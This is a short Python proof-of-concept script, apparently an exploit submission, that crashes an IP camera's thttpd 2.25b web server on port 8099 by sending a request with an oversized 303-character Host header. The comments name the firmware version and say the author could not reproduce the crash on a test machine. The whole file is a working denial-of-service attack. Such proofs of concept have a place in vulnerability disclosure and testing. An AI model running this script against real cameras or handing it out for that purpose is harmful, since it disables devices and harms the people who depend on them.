import requests
# buffer > 302 = crash
# local dos poc
# firmware 0.1.9.0
# ipcam runs thttpd 2.25b 29dec2003 wasn't able to reproduce the crash on my test machine so I wasn't able to debug with gdb..

buffer = 303 * "X"
headers = {
    "Host": buffer
}
host = input('Local IP of camera: ')
url = 'http://' + host + ':8099'
try:
    r = requests.get(url, headers=headers)
except requests.exceptions.ConnectionError as e:
    print('Host has been crashed.')
    print(e)